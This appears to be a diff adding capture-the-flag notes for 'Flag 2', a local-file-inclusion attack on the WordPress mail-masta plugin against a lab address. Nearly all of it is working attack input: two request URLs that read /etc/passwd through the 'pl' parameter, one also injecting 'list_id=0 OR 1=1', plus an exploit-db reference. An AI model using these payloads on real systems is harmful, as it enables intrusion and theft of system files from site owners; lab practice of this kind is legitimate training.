@@ -1,0 +1,6 @@
+### Flag 2 - mail-masta - 1.0 - LFI/RFI (https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin-SQL-Injection-Vulnerability)
+http://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/etc/passwd
+# Adicionado o /etc/passwd em um arquivo "passwd"
+
+https://www.exploit-db.com/exploits/40290
+http://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
